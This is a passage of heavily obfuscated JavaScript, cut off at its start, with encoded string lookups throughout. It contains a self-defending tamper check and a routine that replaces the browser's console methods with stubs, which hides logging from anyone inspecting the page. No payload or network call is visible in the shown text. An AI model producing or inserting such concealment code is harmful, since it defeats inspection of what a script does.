Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};